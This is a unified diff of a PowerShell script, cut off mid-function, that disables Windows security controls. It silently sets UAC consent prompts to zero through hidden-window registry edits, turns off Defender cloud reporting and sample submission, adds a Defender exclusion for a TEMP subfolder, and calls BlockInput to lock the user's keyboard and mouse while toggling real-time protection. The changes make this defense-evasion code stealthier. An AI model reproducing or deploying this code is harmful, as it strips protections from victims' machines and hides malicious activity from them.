@@ -38,10 +38,10 @@ function set-window {
 }
 
 function disable-uac {
-	Start-Process -Verb RunAs -Wait reg 'add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f'
-	Start-Process -Verb RunAs -Wait reg 'add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f'
-	Start-Process -Verb RunAs -Wait reg 'add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f'
-	Start-Process -Verb RunAs -Wait reg 'add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f'
+	Start-Process -Verb RunAs -Wait -WindowStyle Hidden reg 'add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f'
+	Start-Process -Verb RunAs -Wait -WindowStyle Hidden reg 'add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f'
+	Start-Process -Verb RunAs -Wait -WindowStyle Hidden reg 'add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f'
+	Start-Process -Verb RunAs -Wait -WindowStyle Hidden reg 'add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f'
 }
 
 function defender-realtime-protection {
@@ -49,13 +49,13 @@ function defender-realtime-protection {
 	param(
 		[bool]$status = $true
 	)
-$code = @"
+$code = @'
 [DllImport("user32.dll")]
 public static extern bool BlockInput(bool fBlockIt);
-"@
+'@
 	Set-MpPreference -MAPSReporting Disable
 	Set-MpPreference -SubmitSamplesConsent NeverSend
-	Add-MpPreference -ExclusionPath "$Env:TEMP\ssokka" -Force
+	Add-MpPreference -ExclusionPath "$Env:TEMP\Download" -Force
 	if ((Get-MpComputerStatus).RealTimeProtectionEnabled -ne $status) {
 		$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
 		while($true) {
